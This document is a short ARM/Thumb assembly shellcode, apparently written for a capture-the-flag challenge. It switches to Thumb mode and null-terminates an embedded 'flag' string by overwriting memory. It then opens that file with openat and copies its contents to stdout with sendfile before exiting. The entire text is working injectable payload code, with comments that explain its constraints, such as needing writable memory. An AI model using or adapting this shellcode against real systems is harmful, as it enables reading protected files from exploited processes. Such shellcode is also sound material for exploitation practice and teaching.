    .global   _start
    .text
    _start:
    .code 32
	     sub sp, sp, #255 @declare 255 byte buffer for input string
	     @mov r5, #256 @ 0400
	     mov r5, #255
	     add r5, #256 @0777 for mode_t

	     mov r10, #255 @ load 0x142 syscall number for openat later
	     add r10, #67

	     @Thumb-Mode on
    	     add     r6, pc, #1
    	     bx  r6
    .code 16
	     mov r11, sp @frame pointer in r11 to access local variables later (buffer) 
	
	     @@get pointer to filename string
	     mov r0, #48 @ 40 - r0 points to the file name
	     add r0, pc

	     @place a null terminator right behind "flag"
	     mov r2, #48 
	     add r2, pc @points now on the byte after "flag" which is Z
	     eor r1, r1 @xor to get null byte
	     strb r1,[r2] @make sure that memory is writeable (thus this shellcode needs to be placed in writetable memory )
	     @mov r8, r8 @nop test
	
	     @@ openat
	     mov r1, r0			 @get filename
	     mov r0, #100 		@ macro AT_FDCWD is -100 - used as dirfd
	     neg r0, r0  		@negate so we have -100 in r0
	     mov r2, #2 		@fd status flags READWRITE
             mov r3, r5             @ file permissions  
	     mov r7, r10 		@ openat syscall              
	     svc 1          	  @open the file ... r0 will contain the file descriptor
	     mov r4, r0 		@save fd

	     @@ send file
	     mov r0, #1 		@stdout
	     mov r1, r4 		@ restore in_fd from r4 to r1
	     eor r2, r2  	@offset is 0
	     mov r3, #255 	@count of to read bytes
   	     mov r7, #0xbb 	 @ sendfile syscall and returns count of read bytes in r0
    	     svc 1
	     mov r5, r0 		@save count
         
	     @@ close file
             mov r0, r4 		 @restore fd from r4 in r0
             mov r7, #6
             svc 1 			@close
             
	     mov sp, r11 		@ deallocate local variables (buffer)

	     @@ exit program            
	     mov r7, #1 		 @ exit 
             svc 1 

	    @ mov r6, #1 @ NOP - for alignment (needed for pc relative adressing)

	     .ascii "flagZZZ" @this string will be overwritten to "flag\0ZZ" the other two Z are just for alignment    
